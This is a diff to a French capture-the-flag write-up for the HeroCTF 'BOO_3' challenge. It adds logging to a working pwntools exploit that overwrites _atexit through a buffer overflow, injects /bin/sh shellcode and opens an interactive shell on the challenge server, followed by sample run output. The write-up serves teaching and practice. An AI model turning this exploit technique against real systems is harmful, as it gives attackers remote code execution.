@@ -13,7 +13,7 @@ Format : Hero{flag}
 SoEasY
 
 ### Solution
-\# TODO
+// TODO
 
 Encore une fois il y a deux écoles :
 - La tem "one liner"
@@ -46,16 +46,18 @@ elf = ELF('./BOO_3')
 r = remote('challs.heroctf.fr', 7002)
 
 hackername = elf.sym['hackername']
+log.success("BUFFER ADRESS : "+hex(hackername))
 atexit = elf.sym['_atexit']
+log.success("_atexit ADRESS : "+hex(atexit))
+buff_size = atexit - hackername
+log.success("BUFFER SIZE : "+str(buff_size))
 
-context.clear(arch='i386')
-
-print(atexit - hackername)
-
-pld = asm(shellcraft.sh())
-pld += "A"*(atexit - hackername - len(pld))
+log.success("Preparing payload")
+pld = asm(shellcraft.sh()) # shellcode to spawn /bin/sh
+pld += "A"*(buff_size - len(pld))
 pld += p32(hackername)
 
+log.success("Enjoy your shell :)")
 r.sendline(pld)
 r.interactive()
 ```
@@ -70,7 +72,11 @@ $ python exploit_boo3.py
     PIE:      No PIE (0x8048000)
     RWX:      Has RWX segments
 [+] Opening connection to challs.heroctf.fr on port 7002: Done
-512
+[+] BUFFER ADRESS : 0x804c040
+[+] _atexit ADRESS : 0x804c240
+[+] BUFFER SIZE : 512
+[+] Preparing payload
+[+] Enjoy your shell :)
 [*] Switching to interactive mode
 ---------- EN DEVELOPPEMENT ----------
 Quel est ton nom ?
